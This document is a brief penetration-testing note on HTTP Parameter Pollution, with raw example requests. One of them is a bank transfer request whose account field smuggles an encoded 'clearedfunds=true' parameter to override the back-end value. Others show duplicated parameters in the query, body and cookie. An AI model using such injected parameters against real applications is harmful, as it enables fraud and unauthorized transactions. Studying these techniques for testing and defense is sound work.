# HTTP Parameter Pollution

Use the first instance of the parameter, Use the last instance of the parameter. Concatenate the parameter values, maybe adding a separator between them. Construct an array containing all the supplied values

```POST /doTransfer.asp HTTP/1.0
Host: example.com
Content-Length: 62
fromacc=18281008&amount=1430&clearedfunds=false&toacc=08447656```

And the back-end server uses the first instance of any duplicated parameter, an attacker can place the attack into the FromAccount parameter in the front-end

### request:

```POST /bank/52/Default.aspx HTTP/1.0
Host: example.com
Content-Length: 96
FromAccount=18281008%26clearedfunds%3dtrue&Amount=1430&ToAccount=0844765
6&Submit=Submit```

The results of HPP attacks are heavily dependent on how the target application server handles multiple occurrences of the same parameter, and the precise insertion point within the back-end request.

### GET Req

```GET /foo?par1=val1&par2=val2 HTTP/1.1
User-Agent: Mozilla/5.0
Host: Host
Accept: */*```

### POST Req

```POST /foo HTTP/1.1
User-Agent: Mozilla/5.0
Host: Host
Accept: */*
Content-Length: 19
par1=val1&par2=val2c```

### Cookie

```POST /index.aspx?par=1&par=2 HTTP/1.1
User-Agent: Mozilla/5.0
Host: Host
Cookie: par=5; par=6
Content-Length: 19
par=3&par=4```

